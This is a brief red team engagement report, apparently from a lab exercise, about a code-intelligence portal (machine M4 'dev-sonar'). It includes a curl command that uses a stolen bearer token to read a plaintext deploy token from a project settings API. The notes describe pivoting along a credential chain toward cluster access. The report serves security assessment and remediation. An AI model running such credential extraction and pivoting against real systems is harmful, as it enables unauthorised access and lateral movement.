# Red Team Engagement Report — M4 · dev-sonar
**Report ID:** RED-REPORT-DEV01-M04 | **Operator:** Rudra-7

---
## Executive Summary
| Item | Value |
|---|---|
| Target | PUL Code Intelligence Portal · 11.x.x.x:9200 |
| Vulnerability | Deploy Commander token in plaintext project settings API |
| MITRE | T1552.002 |
| Outcome | **SUCCESS** — Deploy Commander token extracted |
| Pivot | M5 dev-deploy (11.x.x.x:8888) |

---
## Exploitation
```bash
# Authenticate with token from M3
curl -s "http://11.x.x.x:9200/api/settings/values?component=pul-firmware-ota" \
     -H "Authorization: Bearer sqa_pul_admin_2024_gridfall"

# Response includes:
# {"key":"sonar.ci.deploy_token","value":"dc-pul-deploy-2024-gridfall"}
# {"key":"sonar.ci.deploy_url","value":"http://11.x.x.x:8888"}
```

## Operator Notes (Rudra-7)
The DEVOPS-3102 ticket visible in the UI notes field ("pending migration to HashiCorp Vault") represents the same systemic pattern — Vault integration planned, never delivered. This is the fourth consecutive machine where Vault was the intended solution and delivery pressure won. The full credential chain from a public bucket file to K8s cluster access is now one step away.
